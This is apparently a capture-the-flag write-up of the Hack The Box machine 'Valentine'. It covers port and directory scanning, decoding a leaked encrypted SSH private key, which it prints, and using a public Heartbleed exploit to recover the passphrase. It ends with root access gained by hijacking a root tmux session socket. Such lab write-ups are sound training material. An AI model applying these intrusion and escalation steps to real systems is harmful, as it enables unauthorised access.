# Valentine

![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/0928706d-54c9-484c-a320-03107bd816ba)

## Difficulty = Easy
---

Let run Our nmap scan :

```sh
# Nmap 7.94 scan initiated Fri Aug 11 15:00:18 2023 as: nmap -p22,80,443 --min-rate=1000 -sCV -v -oN nmap.txt 10.10.10.79
Nmap scan report for 10.10.10.79
Host is up (0.30s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Issuer: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2018-02-06T00:45:25
| Not valid after:  2019-02-06T00:45:25
| MD5:   a413:c4f0:b145:2154:fb54:b2de:c7a9:809d
|_SHA-1: 2303:80da:60e7:bde7:2ba6:76dd:5214:3c3c:6f53:01b1
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2023-08-11T19:00:50+00:00; 0s from scanner time.
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 11 15:00:53 2023 -- 1 IP address (1 host up) scanned in 35.14 seconds
```

We have a website (Port 80/443), Navigating there gives us this

![](https://i.imgur.com/qOqImDC.png)

Nothing much, just an image file, let us `view-source` :

![](https://i.imgur.com/x9p2z0M.png)

Still nothing, let check directory-bruteforce

```sh
sec-fortress@Pwn-F0rk-3X3C:~/HTB/Valentine$ gobuster dir -u http://10.10.10.79/ -w ~/SecLists-master/Discovery/Web-Content/common.txt -b 401,400,400,501,402,404,403 -x bak,zip,php,PHP,txt,html -t 40 2>/dev/null
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.79/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /home/sec-fortress/SecLists-master/Discovery/Web-Content/common.txt
[+] Negative Status codes:   400,501,402,404,403,401
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,PHP,txt,html,bak,zip
[+] Timeout:                 10s
===============================================================
2023/08/11 15:02:01 Starting gobuster in directory enumeration mode
===============================================================
/decode.php           (Status: 200) [Size: 552]
/decode               (Status: 200) [Size: 552]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]
/encode               (Status: 200) [Size: 554]
/encode.php           (Status: 200) [Size: 554]
/index                (Status: 200) [Size: 38]
/index.php            (Status: 200) [Size: 38]
/index.php            (Status: 200) [Size: 38]

===============================================================
2023/08/11 15:12:09 Finished
===============================================================
```

Nice let us check /dev first :

![](https://i.imgur.com/js9aULK.png)

Checking `notes.txt` Looks like we have a note to fix our encoder/decoder :

![](https://i.imgur.com/SlI3l6k.png)

Let check `hype_key` :

![](https://i.imgur.com/aRpJARY.png)

We have an hexadecimal encoded string, let decode it :

![](https://i.imgur.com/hOLDHiT.png)

Since the giving decoder can't decode it and our notes.txt was to fix the encoder/decoder, let us use a third party decoder :

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

- save it into a file with the name `id_rsa`
- Grant permissions with `chmod 600 id_rsa`
- Run `ssh -i id_rsa dev@10.10.10.79` 

![](https://i.imgur.com/SldqtLb.png)

Looks like we are been asked for the passphrase of the id_rsa key, here is why :

>With SSH keys, if someone gains access to your computer, the attacker can gain access to every system that uses that key. **To add an extra layer of security**,
the passphrase is just a key used to encrypt the file that contains the RSA key, using a symmetric cipher (usually DES or 3DES). In order to use the key for public-key encryption, you first need to decrypt its file using the decryption key


- after much research i noticed that the port 443/https website is vulnerable to `# OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)`


Tip:
> Always use nmap with the `--script vuln` switch, it brings fortune 😆

Picked up an exploit from [here](https://www.exploit-db.com/exploits/32764) and ran it :

![](https://i.imgur.com/UungXfE.png)

Note: you might need to run the exploit more than once before it works, i ran it 4 times 😭

- Now we've got the key in base64 encoded format, decoding it gives us the passphrase :

![](https://i.imgur.com/9eTvyyL.png)

Let login via ssh again with the user `hype` , but before that add this to your ~/.ssh/config file, if you don't have a config file, then create it with `touch ~/.ssh/config` and add this text to it :

```
Host *
    PubkeyAcceptedKeyTypes +ssh-rsa
```

![](https://i.imgur.com/MRelCBv.png)
### Successfully logged in, let do privilege escalation

- let run `ls -a` in the home directory :

![](https://i.imgur.com/hX43KPJ.png)

- Nothing much, doing `ps aux` gave me an unusual tmux snapshot running as root

![](https://i.imgur.com/iw06g1Y.png)


- using the command `/usr/bin/tmux -S /.devs/dev_sess` , then gave us root :

![](https://i.imgur.com/fEzrwT2.png)

Baaaannnnnnkaiiii🧘‍♀️

<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>

